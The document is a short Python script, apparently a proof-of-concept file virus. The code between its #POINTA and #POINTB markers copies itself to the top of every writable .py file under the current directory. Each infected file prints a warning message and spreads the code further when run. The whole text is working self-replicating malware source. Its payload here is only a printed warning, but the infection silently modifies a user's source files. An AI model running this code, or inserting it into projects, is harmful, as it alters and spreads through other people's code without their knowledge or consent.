
#POINTA
print("THE TEST CODE HAS BEEN INJECTED. IF YOU DONT KNOW WHY YOU GET THIS MESSAGE PLEASE CHECK IF THIS WAS INJECTED BY ACCIDENT. NOTE: PLEASE CHECK YOUR COMPUTER FOR UNKNOWN SOFTWARE IF YOU DONT KNOW WHERE THIS MESSAGE ORIGINATES FROM")
from pathlib import Path
import os
import sys
def zero_f(path):
    with open(path,"r+") as f:
        with open(sys.argv[0],"r") as o:
            data ="\n#POINTA"
            data += o.read().split('\n#POINTA')[1].split('\n#POINTB')[0]
            data+='\n#POINTB'
            content = f.read()
            if(data in content):
                f.close()
                o.close()
                return
            else:
                f.seek(0)
                f.write(data + "\n" + content)
                f.close()
                o.close()
for path in Path(os.getcwd()).rglob('*.py'):
    if(path.name=="replicator.py"):
        continue
    if(str(path.resolve()) == sys.argv[0]):
        continue
    if(os.access(path.resolve(),os.W_OK)):
        #print("W - " + str(path.resolve()))
        zero_f(str(path.resolve()))
    else:
        #print("NW - " + str(path.resolve()))
        continue
#POINTB
